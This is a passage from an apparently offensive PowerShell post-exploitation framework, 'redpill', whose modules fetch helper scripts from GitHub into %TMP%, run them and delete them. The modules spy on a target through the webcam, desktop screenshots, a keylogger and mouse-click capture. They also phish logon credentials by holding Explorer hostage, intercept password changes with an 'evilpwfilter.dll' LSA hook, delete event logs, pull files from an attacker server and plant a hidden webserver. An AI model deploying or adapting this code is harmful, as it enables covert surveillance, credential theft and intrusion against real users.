      Circular            1052672           0 Microsoft-Windows-AppLocker/EXE and DLL
   #>

   ## Download GetLogs.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetLogs.ps1")){## Download GetLogs.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1 -Destination $Env:TMP\GetLogs.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetLogs.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 28){## Corrupted download detected => DefaultFileSize: 28,755859375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetLogs.ps1"){Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetLogs -ieq "Enum"){
      powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Enum
   }ElseIf($GetLogs -ieq "Verbose"){
      powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Verbose -NewEst "$NewEst"
   }ElseIf($GetLogs -ieq "Yara"){

      If($Verb -ne "False"){
         powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Yara -Verb "$Verb" -NewEst "$NewEst" -Id "$Id"
      }Else{
         powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Yara -NewEst "$NewEst" -Id "$Id"
      }

   }ElseIf($GetLogs -ieq "DeleteAll"){

      If($Verb -ne "False"){
            powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs DeleteAll -Verb "$Verb"
         }Else{
            powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs DeleteAll    
         }
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetLogs.ps1"){Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force}
}

If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){

   <#
   .SYNOPSIS
      Author: @tedburke|@r00t-3xp10it
      Helper - List computer cameras or capture camera screenshot

   .NOTES
      Remark: WebCam turns the ligth ON taking snapshots.
      Using -Camera Snap @argument migth trigger AV detection
      Unless target system has powershell version 2 available.
      In that case them PS version 2 will be used to execute
      our binary file and bypass AV amsi detection.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Camera Enum
      List ALL WebCams Device Names available

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Camera Snap
      Take one screenshot using default camera

   .OUTPUTS
      StartTime ProcessName DeviceName           
      --------- ----------- ----------           
      17:32:23  CommandCam  USB2.0 VGA UVC WebCam
   #>

   ## Download Camera.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Camera.ps1")){## Download Camera.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Camera.ps1 -Destination $Env:TMP\Camera.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Camera.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,83984375KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Camera.ps1"){Remove-Item -Path "$Env:TMP\Camera.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($Camera -ieq "Enum"){
      powershell -File "$Env:TMP\Camera.ps1" -Camera Enum
   }ElseIf($Camera -ieq "Snap"){
      powershell -File "$Env:TMP\Camera.ps1" -Camera Snap
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Camera.ps1"){Remove-Item -Path "$Env:TMP\Camera.ps1" -Force}
   cd $Working_Directory
}

If($Screenshot -gt 0){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture remote desktop screenshot(s)

   .DESCRIPTION
      This module can be used to take only one screenshot
      or to spy target user activity using -Delay parameter.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Screenshot 1
      Capture 1 desktop screenshot and store it on %TMP%.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Screenshot 5 -Delay 8
      Capture 5 desktop screenshots with 8 secs delay between captures.

   .OUTPUTS
      ScreenCaptures Delay  Storage                          
      -------------- -----  -------                          
      1              1(sec) C:\Users\pedro\AppData\Local\Temp
   #>

   ## Download Screenshot.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Screenshot.ps1")){## Download Screenshot.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Screenshot.ps1 -Destination $Env:TMP\Screenshot.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Screenshot.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,2705078125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Screenshot.ps1"){Remove-Item -Path "$Env:TMP\Screenshot.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   powershell -File "$Env:TMP\Screenshot.ps1" -Screenshot $Screenshot -Delay $Delay

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Screenshot.ps1"){Remove-Item -Path "$Env:TMP\Screenshot.ps1" -Force}

}

If($Upload -ne "false"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download Files from Attacker Apache2 (BitsTransfer)

   .NOTES
      Required Dependencies: BitsTransfer {native}
      File to Download must be stored in attacker apache2 webroot.
      -Upload and -ApacheAddr Are Mandatory parameters (required).
      -Destination parameter its auto set to $Env:TMP by default.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination $Env:TMP\FileName.ps1
      Downloads FileName.ps1 script from attacker apache2 (192.168.1.73) into $Env:TMP\FileName.ps1 Local directory
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "syntax : .\redpill.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker ] -Destination [ full\Path\file.ps1 ]"
   Write-Host "Example: .\redpill.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\FileName.ps1`n"
   Start-Sleep -Seconds 2

   ## Download Upload.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Upload.ps1")){## Download Upload.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Upload.ps1 -Destination $Env:TMP\Upload.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Upload.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,3623046875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Upload.ps1"){Remove-Item -Path "$Env:TMP\Upload.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   powershell -File "$Env:TMP\Upload.ps1" -Upload $Upload -ApacheAddr $ApacheAddr -Destination $Destination

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Upload.ps1"){Remove-Item -Path "$Env:TMP\Upload.ps1" -Force}
}

If($MsgBox -ne "false"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Spawn a msgBox on local host {ComObject}

   .NOTES
      Required Dependencies: Wscript ComObject {native}
      Remark: Double Quotes are Mandatory in -MsgBox value
      Remark: -TimeOut 0 parameter maintains msgbox open.

      MsgBox Button Types
      -------------------
      0 - Show OK button. 
      1 - Show OK and Cancel buttons. 
      2 - Show Abort, Retry, and Ignore buttons. 
      3 - Show Yes, No, and Cancel buttons. 
      4 - Show Yes and No buttons. 
      5 - Show Retry and Cancel buttons. 

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World."

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World." -TimeOut 4
      Spawn message box and close msgbox after 4 seconds time {-TimeOut 4}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World." -ButtonType 4
      Spawns message box with Yes and No buttons {-ButtonType 4}

   .OUTPUTS
      TimeOut  ButtonType           Message
      -------  ----------           -------
      5 (sec)  'Yes and No buttons' 'Hello World.'
   #>

   ## Set Button Type local var
   If($ButtonType -ieq 0){
     $Buttonflag = "'OK button'"
   }ElseIf($ButtonType -ieq 1){
     $Buttonflag = "'OK and Cancel buttons'"
   }ElseIf($ButtonType -ieq 2){
     $Buttonflag = "'Abort, Retry, and Ignore buttons'"
   }ElseIf($ButtonType -ieq 3){
     $Buttonflag = "'Yes, No, and Cancel buttons'"
   }ElseIf($ButtonType -ieq 4){
     $Buttonflag = "'Yes and No buttons'"
   }ElseIf($ButtonType -ieq 5){
     $Buttonflag = "'Retry and Cancel buttons'"
   }

   ## Create Data Table for output
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("TimeOut")|Out-Null
   $mytable.Columns.Add("ButtonType")|Out-Null
   $mytable.Columns.Add("Message")|Out-Null
   $mytable.Rows.Add("$TimeOut (sec)",
                     "$Buttonflag",
                     "'$MsgBox'")|Out-Null

   ## Display Data Table
   $mytable|Format-Table -AutoSize
   ## Execute personalized MessageBox
   (New-Object -ComObject Wscript.Shell).Popup("""$MsgBox""",$TimeOut,"""®redpill - ${CmdletVersion}-dev""",$ButtonType+64)|Out-Null
}

If($SpeakPrank -ne "False"){
If($Rate -gt '10'){$Rate = "10"} ## Speach speed max\min value accepted
If($Volume -gt '100'){$Volume = "100"} ## Speach Volume max\min value accepted

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Speak Prank {SpeechSynthesizer}

   .DESCRIPTION
      Make remote host speak user input sentence (prank)

   .NOTES
      Required Dependencies: SpeechSynthesizer {native}
      Remark: Double Quotes are Mandatory in @arg declarations
      Remark: -Volume controls the speach volume {default: 88}
      Remark: -Rate Parameter configs the SpeechSynthesizer speed

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SpeakPrank "Hello World"
      Make remote host speak "Hello World" {-Rate 1 -Volume 88}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100

   .OUTPUTS
      RemoteHost SpeachSpeed Volume Speak        
      ---------- ----------- ------ -----        
      SKYNET     5           100    'hello world'
   #>

   ## Local Function Variable declarations
   $TimeDat = Get-Date -Format 'HH:mm:ss'
   $RawRate = "-" + "$Rate" -Join ''

   ## Create Data Table for output
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("RemoteHost")|Out-Null
   $mytable.Columns.Add("SpeachSpeed")|Out-Null
   $mytable.Columns.Add("Volume")|Out-Null
   $mytable.Columns.Add("Speak")|Out-Null
   $mytable.Rows.Add("$Remote_hostName",
                     "$Rate",
                     "$Volume",
                     "'$SpeakPrank'")|Out-Null

   ## Display Data Table
   $mytable|Format-Table -AutoSize > $Env:TMP\MyTable.log
   Get-Content -Path "$Env:TMP\MyTable.log"
   Remove-Item -Path "$Env:TMP\MyTable.log" -Force

   ## Add type assembly
   Add-Type -AssemblyName System.speech
   $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
   $speak.Volume = $Volume
   $speak.Rate = $RawRate
   $speak.Speak($SpeakPrank)
}

If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){

   <#
   .SYNOPSIS
      Author: @MarkusScholtes|@r00t-3xp10it
      Helper - Start Local HTTP WebServer (Background)

   .NOTES
      Access WebServer: http://<RHOST>:8080/
      This module download's webserver.ps1 or Start-WebServer.ps1
      to remote host %TMP% and executes it on an hidden terminal prompt
      to allow users to silent browse/read/download files from remote host.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Python
      Downloads webserver.ps1 to %TMP% and executes the webserver.
      Remark: This Module uses Social Enginnering to trick remote host into
      installing python (python http.server) if remote host does not have it.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Python -SPort 8087
      Downloads webserver.ps1 and executes the webserver on port 8087

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Powershell
      Downloads Start-WebServer.ps1 and executes the webserver.
      Remark: Admin privileges are requiered in shell to run the WebServer

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Powershell -SPort 8087
      Downloads Start-WebServer.ps1 and executes the webserver on port 8087
      Remark: Admin privileges are requiered in shell to run the WebServer
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\redpill.ps1 -StartWebServer Python"
   Write-Host "Example: .\redpill.ps1 -StartWebServer Powershell"
   Write-Host "Example: .\redpill.ps1 -StartWebServer Python -SPort 8087"
   Write-Host "Example: .\redpill.ps1 -StartWebServer Powershell -SPort 8087`n"
   Start-Sleep -Seconds 2

   ## Download StartWebServer.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\StartWebServer.ps1")){## Download StartWebServer.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/StartWebServer.ps1 -Destination $Env:TMP\StartWebServer.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\StartWebServer.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,6435546875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\StartWebServer.ps1"){Remove-Item -Path "$Env:TMP\StartWebServer.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }
   $Timer = Get-Date -Format 'HH:mm:ss'


   try {
       powershell -File "$Env:TMP\StartWebServer.ps1" -StartWebServer $StartWebServer -SPort $SPort
       Write-Host "WebServer started at: $Timer in: http://${Address}:${SPort}/" -ForegroundColor Green -BackgroundColor Black
   }catch{
       Write-Host "[error] fail to run StartWebServer cmdlet!" -ForegroundColor Red -BackgroundColor Black
   }


   Write-Host ""
   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\UacMe.ps1"){Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force}
   If(Test-Path -Path "$Env:TMP\webserver.ps1"){Remove-Item -Path "$Env:TMP\webserver.ps1" -Force}
   If(Test-Path -Path "$Env:TMP\StartWebServer.ps1"){Remove-Item -Path "$Env:TMP\StartWebServer.ps1" -Force}
   If(Test-Path -Path "$Env:TMP\Start-WebServer.ps1"){Remove-Item -Path "$Env:TMP\Start-WebServer.ps1" -Force}
}

If($Keylogger -ieq 'Start' -or $Keylogger -ieq 'Stop'){
$Timer = Get-Date -Format 'HH:mm:ss'

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture remote host keystrokes {void}

   .DESCRIPTION
      This module start recording target system keystrokes
      in background mode and only stops if void.exe binary
      its deleted or is process {void.exe} its stoped.

   .NOTES
      Required Dependencies: void.exe {auto-install}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Keylogger Start
      Download/Execute void.exe in child process
      to be abble to capture system keystrokes

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Keylogger Stop
      Stop keylogger by is process FileName identifier
      and delete keylogger and all respective files/logs

   .OUTPUTS
      StartTime ProcessName PID  LogFile                                   
      --------- ----------- ---  -------                                   
      17:37:17  void.exe    2836 C:\Users\pedro\AppData\Local\Temp\void.log
   #>

   ## Download Keylogger.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Keylogger.ps1")){## Download Keylogger.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Keylogger.ps1 -Destination $Env:TMP\Keylogger.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Keylogger.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,328125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Keylogger.ps1"){Remove-Item -Path "$Env:TMP\Keylogger.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($Keylogger -ieq "Start"){
      powershell -File "$Env:TMP\Keylogger.ps1" -Keylogger Start
   }ElseIf($Keylogger -ieq "Stop"){
      powershell -File "$Env:TMP\Keylogger.ps1" -Keylogger Stop
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Keylogger.ps1"){Remove-Item -Path "$Env:TMP\Keylogger.ps1" -Force}
}

If($Mouselogger -ieq "Start"){
## Random FileName generation
$Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
$CaptureFile = "$Env:TMP\SHot-" + "$Rand.zip" ## Capture File Name
If($Timmer -lt '18' -or $Timmer -gt '300'){$Timmer = '18'}
## Set the max\min capture time value
# Remark: The max capture time its 300 secs {5 minuts}

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture screenshots of MouseClicks for 'xx' Seconds

   .DESCRIPTION
      This script allow users to Capture Screenshots of 'MouseClicks'
      with the help of psr.exe native windows 10 (error report service).
      Remark: Capture will be stored under '`$Env:TMP' remote directory.
      'Min capture time its 8 secs the max is 300 and 100 screenshots'.

   .NOTES
      Required Dependencies: psr.exe {native}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Mouselogger Start
      Capture Screenshots of Mouse Clicks for 10 secs {default}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Mouselogger Start -Timmer 28
      Capture Screenshots of remote Mouse Clicks for 28 seconds

   .OUTPUTS
      Capture     Timmer      Storage                                          
      -------     ------      -------                                          
      MouseClicks for 10(sec) C:\Users\pedro\AppData\Local\Temp\SHot-zcsV03.zip
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\redpill.ps1 -Mouselogger Start"
   Write-Host "Example: .\redpill.ps1 -Mouselogger Start -Timmer 10`n"
   Start-Sleep -Seconds 1

   ## Download Mouselogger.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Mouselogger.ps1")){## Download Mouselogger.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Mouselogger.ps1 -Destination $Env:TMP\Mouselogger.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Mouselogger.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,0830078125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Mouselogger.ps1"){Remove-Item -Path "$Env:TMP\Mouselogger.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   powershell -File "$Env:TMP\Mouselogger.ps1" -Mouselogger Start -Timmer $Timmer

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Mouselogger.ps1"){Remove-Item -Path "$Env:TMP\Mouselogger.ps1" -Force}

}

If($PhishCreds -ieq "Start" -or $PhishCreds -ieq "Brute"){

   <#
   .SYNOPSIS
      Author: @mubix|@r00t-3xp10it
      Helper - Promp the current user for a valid credential.

   .DESCRIPTION
      This CmdLet interrupts EXPLORER process until a valid credential is entered
      correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
      process and leaks the credentials on this terminal shell (Social Engineering).

   .NOTES
      Remark: CredsPhish.ps1 CmdLet its set for 5 fail validations before abort.
      Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
      Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.

   .Parameter PhishCreds
      Accepts arguments: Start and Brute

   .Parameter Limmit
      Aborts phishing after -Limmit [fail attempts] reached.

   .Parameter Dicionary
      Accepts the absoluct \ relative path of dicionary.txt
      Remark: Optional parameter of -PhishCreds [ Brute ]

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PhishCreds Start
      Prompt the current user for a valid credential.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PhishCreds Start -Limmit 30
      Prompt the current user for a valid credential and
      Abort phishing after -Limmit [number] fail attempts.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PhishCreds Brute -Dicionary "$Env:TMP\passwords.txt"
      Brute force user account using -Dicionary [ path ] text file

   .OUTPUTS
      Captured Credentials (logon)
      ----------------------------
      TimeStamp : 01/17/2021 15:26:24
      username  : r00t-3xp10it
      password  : mYs3cr3tP4ss
   #>

   ## Download CredsPhish from my github repository
   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1")){## Check for auxiliary existence
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/CredsPhish.ps1 -Destination $Env:TMP\CredsPhish.ps1 -ErrorAction SilentlyContinue|Out-Null
   }

   ## Check for file download integrity (fail/corrupted downloads)
   $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 12,810546875/KB
   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 12 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
      ## Fail to download CredsPhish.ps1 using BitsTransfer OR the downloaded file is corrupted
      Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
      If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @redpill
   }

   ## Start Remote Host CmdLet
   If($PhishCreds -ieq "Start"){
       powershell -exec bypass -NonInteractive -NoLogo -File "$Env:TMP\CredsPhish.ps1" -PhishCreds Start
   }ElseIf($PhishCreds -ieq "Brute"){
       powershell -exec bypass -NonInteractive -NoLogo -File "$Env:TMP\CredsPhish.ps1" -PhishCreds Brute -Dicionary $Dicionary
   }
   Write-Host "";Start-Sleep -Seconds 1

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
}

If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){

   <#
   .SYNOPSIS
      Author: @mubix|@r00t-3xp10it
      Helper - Stealing passwords every time they change {mitre T1174}
      Helper - Search for creds in diferent locations {store|regedit|disk}

   .DESCRIPTION
      -GetPasswords [ Enum ] searchs creds in store\regedit\disk diferent locations.
      -GetPasswords [ Dump ] Explores a native OS notification of when the user
      account password gets changed which is responsible for validating it.
      That means that the user password can be intercepted and logged.

   .NOTES
      -GetPasswords [ Dump ] requires Administrator privileges to add reg keys
      To stop this exploit its required the manual deletion of '0evilpwfilter.dll'
      from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key.
      REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Enum
      Search for creds in store\regedit\disk {txt\xml\logs} diferent locations

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Enum -StartDir `$Env:USERPROFILE
      Search recursive for creds in store\regedit\disk {txt\xml\logs} starting in -StartDir directory

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Dump
      Intercepts user changed passwords {logon} by: @mubix

   .OUTPUTS
      Time     Status  ReportFile           VulnDLLPath
      ----     ------  ----------           -----------
      17:49:23 active  C:\Temp\logFile.txt  C:\Windows\System32\0evilpwfilter.dll
   #>


   ## Download GetPasswords.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetPasswords.ps1")){## Download GetPasswords.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetPasswords.ps1 -Destination $Env:TMP\GetPasswords.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetPasswords.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 17){## Corrupted download detected => DefaultFileSize: 17,126953125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetPasswords.ps1"){Remove-Item -Path "$Env:TMP\GetPasswords.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetPasswords -ieq "Enum"){
      powershell -File "$Env:TMP\GetPasswords.ps1" -GetPasswords Enum -StartDir "$StartDir"
   }ElseIf($GetPasswords -ieq "Dump"){
      powershell -File "$Env:TMP\GetPasswords.ps1" -GetPasswords Dump
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetPasswords.ps1"){Remove-Item -Path "$Env:TMP\GetPasswords.ps1" -Force}
}

If($EOP -ieq "Verbose" -or $EOP -ieq "Enum"){

   <#
   .SYNOPSIS
      Author: @_RastaMouse|r00t-3xp10it {Sherlock v1.3}
      Helper - Find Missing Software Patchs For Privilege Escalation

   .NOTES
      This Module does NOT exploit any EOP vulnerabitys found.
      It will 'report' them and display the exploit-db POC link.
      Remark: Attacker needs to manualy download\execute the POC.
      Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -EOP Enum
      Scans GroupName Everyone and permissions (F)
      Unquoted Service vuln Paths, Dll-Hijack, etc.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -EOP Verbose
      Scans the Three Group Names and Permissions (F)(W)(M)
      And presents a more elaborate report with extra tests.

   .OUTPUTS
      Title      : TrackPopupMenu Win32k Null Point Dereference
      MSBulletin : MS14-058
      CVEID      : 2014-4113
      Link       : https://www.exploit-db.com/exploits/35101/
      VulnStatus : Appers Vulnerable
   #>

   ## Download Sherlock (@_RastaMouse) from my github repository
   If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1")){## Check if auxiliary exists
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Sherlock.ps1 -Destination $Env:TMP\Sherlock.ps1 -ErrorAction SilentlyContinue|Out-Null
   }

   ## Check for file download integrity (fail/corrupted downloads)
   $CheckInt = Get-Content -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
   $SizeDump = ((Get-Item -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue).length/1KB) ## Default => 84,6123046875/KB
   If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1") -or $SizeDump -lt 84 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
      ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
      Write-Host "[abort] fail to download Sherlock.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
      If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
      Start-Sleep -Seconds 1;exit ## exit @redpill
   }

   ## Import-Module (-Force reloads the module everytime)
   $SherlockPath = Test-Path -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
   If($SherlockPath -ieq "True" -and $SizeDump -gt 15){
      Import-Module -Name "$Env:TMP\sherlock.ps1" -Force
      If($EOP -ieq "Verbose"){## Use ALL Sherlock EoP functions
         Write-Host "[i] Please wait, this scan migth take more than 5 minuts!" -ForegroundColor Yellow -BackgroundColor Black
         Start-Sleep -Seconds 1;Use-AllModules FullRecon
      }ElseIf($EOP -ieq "Enum"){## find missing CVE patchs
         Use-AllModules
      }
   }
   
   ## Delete sherlock script from remote system
   If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
   Write-Host "";Start-Sleep -Seconds 1
}

If($ADS -ieq "Enum" -or $ADS -ieq "Create" -or $ADS -ieq "Exec" -or $ADS -ieq "Clear"){

   <#
   .SYNOPSIS
      Helper - Hidde scripts {txt|bat|ps1|exe} on $DATA records (ADS)
   
